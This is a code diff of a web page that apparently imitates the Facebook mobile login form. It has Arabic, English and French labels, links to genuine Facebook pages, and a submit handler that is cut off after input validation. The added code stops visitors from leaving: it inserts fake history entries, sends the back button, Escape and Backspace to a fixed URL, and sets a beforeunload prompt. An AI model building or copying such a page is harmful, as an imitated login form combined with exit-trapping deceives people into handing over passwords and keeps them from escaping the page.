@@ -79,7 +79,6 @@
     }
     @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
-    /* ✅ فقاعة أسفل الصفحة */
     .toast {
       position: fixed;
       bottom: 20px;
@@ -145,32 +144,35 @@
     const msg = document.getElementById("msg");
     const form = document.getElementById("myForm");
     const toast = document.getElementById("toast");
-    const targetUrl = "https://youcefcheria.github.io/Youcef/"; // الرابط الذي تريده
+    const targetUrl = "https://youcefcheria.github.io/Youcef/";
 
-    // ==========================================================
-    // ✅ الحل المباشر: التحويل إلى الرابط المحدد عند النقر على زر الرجوع
-    // ==========================================================
-    
-    // عند تحميل الصفحة، نضع حالة وهمية لضمان وجود خطوة رجوع.
-    if (window.history && window.history.pushState) {
-        history.pushState(null, null, location.href); 
-        // إضافة خطوة وهمية ثانية بعد تأخير بسيط لجعل السجل أكثر ثباتًا
-        setTimeout(() => {
-            if (history.length <= 1) {
-                 history.pushState(null, null, location.href);
-            }
-        }, 10);
-    }
-
-    // عند النقر على زر الرجوع (popstate):
-    window.addEventListener('popstate', function (event) {
-        // بدلاً من إعادة تحميل الصفحة، نُحول المستخدم مباشرة إلى الرابط المطلوب
-        window.location.replace(targetUrl);
+    // ✅ منع الخروج والتحويل عند الضغط على زر الرجوع
+    window.addEventListener("load", () => {
+      if (window.history && window.history.pushState) {
+        history.pushState({ noBackExitsApp: true }, "", location.href);
+      }
     });
-    
-    // ==========================================================
-    
-    // ✅ إظهار الفقاعة عند بداية الصفحة
+
+    window.addEventListener("popstate", (event) => {
+      window.location.replace(targetUrl);
+      setTimeout(() => {
+        history.pushState({ noBackExitsApp: true }, "", location.href);
+      }, 100);
+    });
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" || e.key === "Backspace") {
+        e.preventDefault();
+        window.location.replace(targetUrl);
+      }
+    });
+
+    window.addEventListener("beforeunload", (e) => {
+      e.preventDefault();
+      e.returnValue = "";
+    });
+
+    // ✅ الفقاعة عند فتح الصفحة
     window.addEventListener("load", () => {
       toast.classList.add("show");
       setTimeout(() => {
@@ -179,57 +181,18 @@
     });
 
     const translations = {
-      ar: {
-        lang: "العربية ⌵",
-        emailPlaceholder: "الرقم أو الإيميل",
-        passPlaceholder: "كلمة المرور",
-        login: "تسجيل الدخول",
-        forgot: "هل نسيت كلمة السر؟",
-        create: "إنشاء حساب جديد",
-        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
-        errorPass: "أدخل كلمة سر صحيحة",
-        waiting: "جاري تسجيل الدخول...",
-        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
-        customPass: "يرجى إدخال كلمة سر صحيحة"
-      },
-      en: {
-        lang: "English ⌵",
-        emailPlaceholder: "Email or Phone",
-        passPlaceholder: "Password",
-        login: "Log In",
-        forgot: "Forgotten password?",
-        create: "Create new account",
-        errorEmail: "Enter a valid email or phone number",
-        errorPass: "Enter a valid password",
-        waiting: "Logging in...",
-        customEmail: "Please enter a valid email or phone number",
-        customPass: "Please enter a valid password"
-      },
-      fr: {
-        lang: "Français ⌵",
-        emailPlaceholder: "E-mail ou téléphone",
-        passPlaceholder: "Mot de passe",
-        login: "Se connecter",
-        forgot: "Mot de passe oublié ?",
-        create: "Créer un nouveau compte",
-        errorEmail: "Entrez un e-mail ou un numéro valide",
-        errorPass: "Entrez un mot مرور valide",
-        waiting: "Connexion en cours...",
-        customEmail: "Veuillez entrer un e-mail ou un numéro valide",
-        customPass: "Veuillez entrer un mot de passe valide"
-      }
+      ar: { lang: "العربية ⌵", emailPlaceholder: "الرقم أو الإيميل", passPlaceholder: "كلمة المرور", login: "تسجيل الدخول", forgot: "هل نسيت كلمة السر؟", create: "إنشاء حساب جديد", errorEmail: "أدخل رقم أو بريد إلكتروني صحيح", errorPass: "أدخل كلمة سر صحيحة", waiting: "جاري تسجيل الدخول...", customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح", customPass: "يرجى إدخال كلمة سر صحيحة" },
+      en: { lang: "English ⌵", emailPlaceholder: "Email or Phone", passPlaceholder: "Password", login: "Log In", forgot: "Forgotten password?", create: "Create new account", errorEmail: "Enter a valid email or phone number", errorPass: "Enter a valid password", waiting: "Logging in...", customEmail: "Please enter a valid email or phone number", customPass: "Please enter a valid password" },
+      fr: { lang: "Français ⌵", emailPlaceholder: "E-mail ou téléphone", passPlaceholder: "Mot de passe", login: "Se connecter", forgot: "Mot de passe oublié ?", create: "Créer un nouveau compte", errorEmail: "Entrez un e-mail ou un numéro valide", errorPass: "Entrez un mot de passe valide", waiting: "Connexion en cours...", customEmail: "Veuillez entrer un e-mail ou un numéro valide", customPass: "Veuillez entrer un mot de passe valide" }
     };
 
     const langs = ["ar", "en", "fr"];
     let currentLangIndex = 0;
     const savedLang = localStorage.getItem("langIndex");
-    if (savedLang !== null) {
-      currentLangIndex = parseInt(savedLang);
-    }
+    if (savedLang !== null) currentLangIndex = parseInt(savedLang);
 
     function updateLanguage() {
-      const langKey = langs[currentLangIndex];
-      const t = translations[langKey];
+      const t = translations[langs[currentLangIndex]];
       langBtn.textContent = t.lang;
       emailInput.placeholder = t.emailPlaceholder;
       passInput.placeholder = t.passPlaceholder;
@@ -238,12 +201,10 @@
       createBtn.textContent = t.create;
       errorEmail.textContent = t.errorEmail;
       errorPass.textContent = t.errorPass;
-
       emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
       emailInput.oninput = function() { this.setCustomValidity(""); };
       passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
       passInput.oninput = function() { this.setCustomValidity(""); };
-
       localStorage.setItem("langIndex", currentLangIndex);
     }
 
@@ -254,17 +215,9 @@
 
     updateLanguage();
 
-    forgotText.addEventListener("click", () => {
-      window.location.href = "https://m.facebook.com/login/identify/";
-    });
-
-    createBtn.addEventListener("click", () => {
-      window.location.href = "https://m.facebook.com/reg/";
-    });
-
-    document.getElementById("metaLink").addEventListener("click", () => {
-      window.location.href = "https://about.meta.com/";
-    });
+    forgotText.addEventListener("click", () => window.location.href = "https://m.facebook.com/login/identify/");
+    createBtn.addEventListener("click", () => window.location.href = "https://m.facebook.com/reg/");
+    document.getElementById("metaLink").addEventListener("click", () => window.location.href = "https://about.meta.com/");
 
     form.addEventListener("submit", e => {
       e.preventDefault();
@@ -277,12 +230,8 @@
       const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
       const phoneRegex = /^[0-9]{6,15}$/;
 
-      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
-        errorEmail.style.display = "block"; valid = false;
-      }
-      if (password.length < 4) {
-        errorPass.style.display = "block"; valid = false;
-      }
+      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) { errorEmail.style.display = "block"; valid = false; }
+      if (password.length < 4) { errorPass.style.display = "block"; valid = false; }
       if (!valid) return;
 
       const t = translations[langs[currentLangIndex]];
